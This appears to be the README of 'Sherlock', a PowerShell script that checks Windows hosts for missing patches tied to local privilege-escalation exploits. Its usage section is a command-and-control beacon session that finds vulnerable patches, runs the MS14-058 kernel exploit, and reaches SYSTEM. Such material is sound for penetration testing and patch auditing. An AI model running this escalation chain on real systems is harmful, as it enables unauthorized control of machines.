# Sherlock

PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.

## Currently looks for:

* MS10-015 : User Mode to Ring (KiTrap0D)
* MS10-092 : Task Scheduler
* MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow
* MS13-081 : TrackPopupMenuEx Win32k NULL Page
* MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference
* MS15-051 : ClientCopyImage Win32k
* MS15-078 : Font Driver Buffer Overflow
* MS16-016 : 'mrxdav.sys' WebDAV
* MS16-032 : Secondary Logon Handle
* CVE-2017-7199 : Nessus Agent 6.6.2 - 6.10.3 Priv Esc

## Tested on:

* Windows 7 SP1 32-bit
* Windows 7 SP1 64-bit
* Windows 8 64-bit
* Windows 10 64-bit

## Basic Usage:

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 20 bytes
[*] You are Win7-x64\Rasta

beacon> powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1
[*] Tasked beacon to import: C:\Users\Rasta\Desktop\Sherlock.ps1
[+] host called home, sent: 2960 bytes

beacon> powershell Find-AllVulns
[*] Tasked beacon to run: Find-AllVulns
[+] host called home, sent: 21 bytes
[+] received output:


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

beacon> elevate ms14-058 smb
[*] Tasked beacon to elevate and spawn windows/beacon_smb/bind_pipe (127.0.0.1:1337)
[+] host called home, sent: 105015 bytes
[+] received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 51216
[*] Parsing SYSTEM_INFO...
[*] 173 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x0264f000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF800029A21FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF800029A59D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C1E7B8B0
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...

[+] host called home, sent: 204885 bytes
[+] established link to child beacon: 192.168.56.105

[+] established link to parent beacon: 192.168.56.105
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
```